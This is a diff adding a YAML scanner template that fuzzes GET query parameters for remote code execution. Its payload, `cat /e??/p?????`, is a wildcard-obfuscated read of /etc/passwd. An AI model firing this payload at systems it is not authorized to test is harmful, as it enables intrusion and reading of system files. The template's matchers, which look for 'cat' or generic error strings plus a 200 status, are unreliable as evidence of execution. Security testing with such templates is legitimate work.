@@ -1,0 +1,40 @@
+id: fuzz-remote-code-execution
+
+info:
+  name: RCE Detection with Path Enumeration
+  author: netbaan
+  severity: high
+  description: |
+    This template attempts to test for Remote Code Execution vulnerabilities using path enumeration via the payload `cat /e??/p?????`.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce:
+        - "cat /e??/p?????"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "No such file or directory"  # Adjust according to expected responses indicating RCE or valid file paths
+          - "Permission denied"  # Adjust as needed to catch other potential outputs
+          - "cat"  # Check for command execution output
+
+      - type: status
+        status:
+          - 200  # Modify or add expected status codes that may indicate vulnerability
